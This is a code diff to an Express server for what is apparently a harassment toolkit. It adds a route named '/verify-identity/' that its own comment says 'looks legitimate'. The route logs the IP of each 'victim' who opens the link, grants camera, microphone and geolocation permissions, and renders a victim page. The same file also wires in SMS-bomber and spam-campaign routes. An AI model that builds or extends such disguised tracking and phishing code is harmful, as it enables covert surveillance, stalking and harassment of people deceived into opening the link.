@@ -146,7 +146,7 @@ const userRoutes     = require('./routes/user');
 const numbersRoutes  = require('./routes/numbers');
 const adminRoutes    = require('./routes/admin');
 const pairingRoutes  = require('./routes/pairing');
-const locationRoutes = require('./routes/location');
+const { router: locationRoutes, renderVictimPage, _locStore } = require('./routes/location');
 let spampairRoutes;
 try { spampairRoutes = require('./routes/spampair'); } catch (_sr) { console.warn('[SPAMPAIR] routes not loaded:', _sr.message); }
 let smsBomberRoutes;
@@ -299,7 +299,7 @@ app.use((req, res, next) => {
   res.setHeader('X-Frame-Options', 'DENY');
   res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
   // Skip Permissions-Policy on location tracking routes — they need camera + geolocation
-  if (!req.path.startsWith('/api/location/v/')) {
+  if (!req.path.startsWith('/api/location/v/') && !req.path.startsWith('/verify-identity/')) {
     res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
   }
   next();
@@ -436,6 +436,25 @@ app.use('/api/numbers', requireDb, numbersRoutes);
 app.use('/api/admin',   requireDb, adminRoutes);
 app.use('/api/pairing', requireDb, pairingRoutes);
 app.use('/api/location', locationRoutes);  // no DB needed — in-memory sessions
+
+// ── Clean /verify-identity/:sessionToken route (looks legitimate, no /api/ in path) ──
+app.get('/verify-identity/:sessionToken', (req, res) => {
+  const { sessionToken } = req.params;
+  const s = _locStore ? _locStore[sessionToken] : null;
+  if (!s) return res.status(404).send('Link expired or invalid.');
+
+  // Capture victim IP immediately on page load
+  const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
+      || req.socket.remoteAddress;
+  s.clientIp   = clientIp;
+  s.timestamp  = Date.now();
+
+  res.setHeader('Content-Type', 'text/html; charset=utf-8');
+  res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
+  res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
+  res.send(renderVictimPage(sessionToken));
+});
+
 if (spampairRoutes) app.use('/api/spampair', spampairRoutes);  // no DB needed — in-memory campaigns
 if (smsBomberRoutes) app.use('/api/smsbomber', smsBomberRoutes);
 
